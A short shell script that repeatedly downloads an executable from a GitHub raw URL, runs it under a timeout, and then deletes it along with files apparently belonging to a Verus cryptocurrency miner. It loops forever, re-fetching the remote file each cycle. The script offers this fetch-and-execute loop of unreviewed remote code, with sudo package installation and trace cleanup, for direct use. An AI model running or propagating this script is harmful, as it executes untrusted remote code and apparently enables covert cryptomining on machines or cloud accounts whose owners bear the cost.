wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running
sudo apt install timelimit -y
while :; do timeout 2800 bash ./running; clear; screen -XS Running quit; rm -f kontol manuk running verus-solver; echo SETTING PROJECT; sleep 360; wget https://raw.githubusercontent.com/renilo/hajar/main/running && chmod +x running; done
